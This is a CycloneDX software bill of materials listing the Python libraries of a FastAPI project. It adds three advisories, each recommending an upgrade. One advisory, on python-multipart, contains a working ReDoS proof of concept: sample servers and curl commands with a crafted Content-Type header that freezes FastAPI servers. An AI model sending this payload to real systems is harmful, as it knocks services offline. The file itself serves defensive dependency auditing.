{"components": [{"bom-ref": "BomRef.6454598204731374.8041923541500847", "name": "Jinja2", "type": "library", "version": "3.1.6"}, {"bom-ref": "BomRef.5622039737851422.17961201759018008", "name": "MarkupSafe", "type": "library", "version": "3.0.2"}, {"bom-ref": "BomRef.9322308310202506.9165356285347479", "name": "SQLAlchemy", "type": "library", "version": "2.0.32"}, {"bom-ref": "BomRef.7321443611523863.19845568542775827", "name": "aiofiles", "type": "library", "version": "24.1.0"}, {"bom-ref": "BomRef.08179473669031845.2571641376537481", "name": "annotated-types", "type": "library", "version": "0.7.0"}, {"bom-ref": "BomRef.3178906744667144.00502399538647913", "name": "anyio", "type": "library", "version": "4.9.0"}, {"bom-ref": "BomRef.5397446265170203.07511778818448389", "name": "asn1crypto", "type": "library", "version": "1.5.1"}, {"bom-ref": "BomRef.032108581250412604.532830761261106", "name": "beautifulsoup4", "type": "library", "version": "4.13.4"}, {"bom-ref": "BomRef.17324613948443757.3296555876974492", "name": "boto3", "type": "library", "version": "1.38.41"}, {"bom-ref": "BomRef.288309781216208.9113489264159444", "name": "botocore", "type": "library", "version": "1.38.41"}, {"bom-ref": "BomRef.7749704309456394.30534370086619256", "name": "certifi", "type": "library", "version": "2025.6.15"}, {"bom-ref": "BomRef.04839730752530658.06770863777702463", "name": "chardet", "type": "library", "version": "5.2.0"}, {"bom-ref": "BomRef.07078709613964895.9554709460908928", "name": "charset-normalizer", "type": "library", "version": "3.4.2"}, {"bom-ref": "BomRef.6412726260470711.5376211103963121", "name": "click", "type": "library", "version": "8.2.1"}, {"bom-ref": "BomRef.8033163038358838.17763528305883336", "name": "et_xmlfile", "type": "library", "version": "2.0.0"}, {"bom-ref": "BomRef.06634858374038821.13074244069189278", "name": "fastapi", "type": "library", "version": "0.115.13"}, {"bom-ref": "BomRef.49310594041763733.3046349973073015", "name": "greenlet", "type": "library", "version": "3.2.3"}, {"bom-ref": "BomRef.416392696845468.036605146847206727", "name": "h11", "type": "library", "version": "0.16.0"}, {"bom-ref": "BomRef.6871673636813214.9667975761869987", "name": "idna", "type": "library", "version": "3.10"}, {"bom-ref": "BomRef.5830329734546872.5954171611470369", "name": "iniconfig", "type": "library", "version": "2.1.0"}, {"bom-ref": "BomRef.24479419265503555.1841297107615214", "name": "jmespath", "type": "library", "version": "1.0.1"}, {"bom-ref": "BomRef.8015755716501117.3044637994639048", "name": "lxml", "type": "library", "version": "5.4.0"}, {"bom-ref": "BomRef.3112186477814224.16776997048404585", "name": "numpy", "type": "library", "version": "2.3.0"}, {"bom-ref": "BomRef.8944645576571274.54071487736339", "name": "numpy-financial", "type": "library", "version": "1.0.0"}, {"bom-ref": "BomRef.8747402085395655.5474037443351697", "name": "openpyxl", "type": "library", "version": "3.1.5"}, {"bom-ref": "BomRef.5777128952830946.4813200857344392", "name": "packaging", "type": "library", "version": "25.0"}, {"bom-ref": "BomRef.7784641122618442.5279699026617071", "name": "pandas", "type": "library", "version": "2.3.0"}, {"bom-ref": "BomRef.29943469123425914.3286524915474497", "name": "pluggy", "type": "library", "version": "1.6.0"}, {"bom-ref": "BomRef.3378928371063459.006217874051400063", "name": "pyarrow", "type": "library", "version": "20.0.0"}, {"bom-ref": "BomRef.7045394207043244.731772722297932", "name": "pydantic", "type": "library", "version": "2.11.7"}, {"bom-ref": "BomRef.6655911541971995.4269386354902144", "name": "pydantic_core", "type": "library", "version": "2.33.2"}, {"bom-ref": "BomRef.3408013758182592.5144542287119748", "name": "pytest", "type": "library", "version": "8.3.4"}, {"bom-ref": "BomRef.0612219585536139.3561264077888395", "name": "pytest-asyncio", "type": "library", "version": "0.25.0"}, {"bom-ref": "BomRef.4738931012684907.5949748137872203", "name": "python-dateutil", "type": "library", "version": "2.9.0.post0"}, {"bom-ref": "BomRef.26289162122572096.527159076526755", "name": "python-dotenv", "type": "library", "version": "1.0.1"}, {"bom-ref": "BomRef.4757955725939075.2978721381195818", "name": "python-multipart", "type": "library", "version": "0.0.6"}, {"bom-ref": "BomRef.35524326169478293.1381269176077805", "name": "pytz", "type": "library", "version": "2025.2"}, {"bom-ref": "BomRef.49662931225333706.5474761646688779", "name": "redshift-connector", "type": "library", "version": "2.1.5"}, {"bom-ref": "BomRef.743184444446478.5569114310977933", "name": "requests", "type": "library", "version": "2.32.4"}, {"bom-ref": "BomRef.5294420797859678.22467929699647549", "name": "s3transfer", "type": "library", "version": "0.13.0"}, {"bom-ref": "BomRef.017115303014939465.31053440075560446", "name": "scipy", "type": "library", "version": "1.15.3"}, {"bom-ref": "BomRef.275070058859465.9554507905847354", "name": "scramp", "type": "library", "version": "1.4.5"}, {"bom-ref": "BomRef.9302227066465263.06343133412379254", "name": "six", "type": "library", "version": "1.17.0"}, {"bom-ref": "BomRef.7739654397501539.17305351503746447", "name": "sniffio", "type": "library", "version": "1.3.1"}, {"bom-ref": "BomRef.19793737980582715.543699121845196", "name": "soupsieve", "type": "library", "version": "2.7"}, {"bom-ref": "BomRef.23630116620559305.42206772577322116", "name": "sse-starlette", "type": "library", "version": "2.3.6"}, {"bom-ref": "BomRef.00865302075470531.6713788283982126", "name": "starlette", "type": "library", "version": "0.46.2"}, {"bom-ref": "BomRef.0748781856470283.8407238144726229", "name": "typing-inspection", "type": "library", "version": "0.4.1"}, {"bom-ref": "BomRef.5677468880992927.15531255995857074", "name": "typing_extensions", "type": "library", "version": "4.14.0"}, {"bom-ref": "BomRef.5410049629912853.6574511999283964", "name": "tzdata", "type": "library", "version": "2025.2"}, {"bom-ref": "BomRef.4066692025427828.40329634746692655", "name": "urllib3", "type": "library", "version": "2.5.0"}, {"bom-ref": "BomRef.24359130332468937.38678752943109684", "name": "uvicorn", "type": "library", "version": "0.34.3"}], "dependencies": [{"ref": "BomRef.6454598204731374.8041923541500847"}, {"ref": "BomRef.5622039737851422.17961201759018008"}, {"ref": "BomRef.9322308310202506.9165356285347479"}, {"ref": "BomRef.7321443611523863.19845568542775827"}, {"ref": "BomRef.08179473669031845.2571641376537481"}, {"ref": "BomRef.3178906744667144.00502399538647913"}, {"ref": "BomRef.5397446265170203.07511778818448389"}, {"ref": "BomRef.032108581250412604.532830761261106"}, {"ref": "BomRef.17324613948443757.3296555876974492"}, {"ref": "BomRef.288309781216208.9113489264159444"}, {"ref": "BomRef.7749704309456394.30534370086619256"}, {"ref": "BomRef.04839730752530658.06770863777702463"}, {"ref": "BomRef.07078709613964895.9554709460908928"}, {"ref": "BomRef.6412726260470711.5376211103963121"}, {"ref": "BomRef.8033163038358838.17763528305883336"}, {"ref": "BomRef.06634858374038821.13074244069189278"}, {"ref": "BomRef.49310594041763733.3046349973073015"}, {"ref": "BomRef.416392696845468.036605146847206727"}, {"ref": "BomRef.6871673636813214.9667975761869987"}, {"ref": "BomRef.5830329734546872.5954171611470369"}, {"ref": "BomRef.24479419265503555.1841297107615214"}, {"ref": "BomRef.8015755716501117.3044637994639048"}, {"ref": "BomRef.3112186477814224.16776997048404585"}, {"ref": "BomRef.8944645576571274.54071487736339"}, {"ref": "BomRef.8747402085395655.5474037443351697"}, {"ref": "BomRef.5777128952830946.4813200857344392"}, {"ref": "BomRef.7784641122618442.5279699026617071"}, {"ref": "BomRef.29943469123425914.3286524915474497"}, {"ref": "BomRef.3378928371063459.006217874051400063"}, {"ref": "BomRef.7045394207043244.731772722297932"}, {"ref": "BomRef.6655911541971995.4269386354902144"}, {"ref": "BomRef.3408013758182592.5144542287119748"}, {"ref": "BomRef.0612219585536139.3561264077888395"}, {"ref": "BomRef.4738931012684907.5949748137872203"}, {"ref": "BomRef.26289162122572096.527159076526755"}, {"ref": "BomRef.4757955725939075.2978721381195818"}, {"ref": "BomRef.35524326169478293.1381269176077805"}, {"ref": "BomRef.49662931225333706.5474761646688779"}, {"ref": "BomRef.743184444446478.5569114310977933"}, {"ref": "BomRef.5294420797859678.22467929699647549"}, {"ref": "BomRef.017115303014939465.31053440075560446"}, {"ref": "BomRef.275070058859465.9554507905847354"}, {"ref": "BomRef.9302227066465263.06343133412379254"}, {"ref": "BomRef.7739654397501539.17305351503746447"}, {"ref": "BomRef.19793737980582715.543699121845196"}, {"ref": "BomRef.23630116620559305.42206772577322116"}, {"ref": "BomRef.00865302075470531.6713788283982126"}, {"ref": "BomRef.0748781856470283.8407238144726229"}, {"ref": "BomRef.5677468880992927.15531255995857074"}, {"ref": "BomRef.5410049629912853.6574511999283964"}, {"ref": "BomRef.4066692025427828.40329634746692655"}, {"ref": "BomRef.24359130332468937.38678752943109684"}], "metadata": {"timestamp": "2025-06-21T19:11:45.322457+00:00"}, "serialNumber": "urn:uuid:d9d9f3d3-1d32-4d98-b7a4-aeb93b2c3bac", "version": 1, "vulnerabilities": [{"bom-ref": "BomRef.09157470818407543.4624156625599545", "description": "### Summary  When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.  An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.  This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS  This only applies when the app uses form data, parsed with `python-multipart`.  ### Details  A regular HTTP `Content-Type` header could look like:  ``` Content-Type: text/html; charset=utf-8 ```  `python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74  A custom option could be made and sent to the server to break it with:  ``` Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ```  ### PoC  Create a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:  ```Python # main.py from wsgiref.simple_server import make_server from wsgiref.validate import validator  from multipart.multipart import parse_options_header   def simple_app(environ, start_response):     _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])      start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])     return [b\"Ok\"]   httpd = make_server(\"\", 8123, validator(simple_app)) print(\"Serving on port 8123...\") httpd.serve_forever() ```  Then send the attacking request with:  ```console $ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/' ```  ### Impact  This is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.  ### Original Report  This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r  <details> <summary>Original report to FastAPI</summary>  Hey Tiangolo!  My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:  ```Python from typing import Annotated from fastapi.responses import HTMLResponse from fastapi import FastAPI,Form from pydantic import BaseModel  class Item(BaseModel):     username: str  app = FastAPI()  @app.get(\"/\", response_class=HTMLResponse) async def index():     return HTMLResponse(\"Test\", status_code=200)  @app.post(\"/submit/\") async def submit(username: Annotated[str, Form()]):     return {\"username\": username}  @app.post(\"/submit_json/\") async def submit_json(item: Item):     return {\"username\": item.username} ```  I'm running the above with uvicorn with the following command:  ```console uvicorn server:app ```  Then run the following cUrl command:  ``` curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/' ```  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.  Cheers  #### Impact  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.  #### Occurrences  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)  </details>", "id": "GHSA-2jv5-9r88-3w3p", "recommendation": "Upgrade"}, {"bom-ref": "BomRef.35414695543855634.6272190887735956", "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.  An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi", "id": "GHSA-59g5-xgcq-4qw3", "recommendation": "Upgrade"}, {"bom-ref": "BomRef.7248848965073945.23126129085831915", "description": "### Summary [Amazon Redshift Python Connector](https://docs.aws.amazon.com/redshift/latest/mgmt/python-redshift-driver.html) is a pure Python connector to Redshift (i.e., driver) that implements the [Python Database API Specification 2.0](https://www.python.org/dev/peps/pep-0249/).  When the Amazon Redshift Python Connector is configured with the BrowserAzureOAuth2CredentialsProvider plugin, the driver skips the SSL certificate validation step for the Identity Provider.   ### Impact  An insecure connection could allow an actor to intercept the token exchange process and retrieve an access token.  **Impacted versions:** >=2.0.872;<=2.1.6  ### Patches  Upgrade Amazon Redshift Python Connector to version 2.1.7 and ensure any forked or derivative code is patched to incorporate the new fixes.  ### Workarounds  None  ### References  If you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our vulnerability reporting page [1] or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com). Please do not create a public GitHub issue.  [1] Vulnerability reporting page: https://aws.amazon.com/security/vulnerability-reporting", "id": "GHSA-r244-wg5g-6w2r", "recommendation": "Upgrade"}], "$schema": "http://cyclonedx.org/schema/bom-1.4.schema.json", "bomFormat": "CycloneDX", "specVersion": "1.4"}
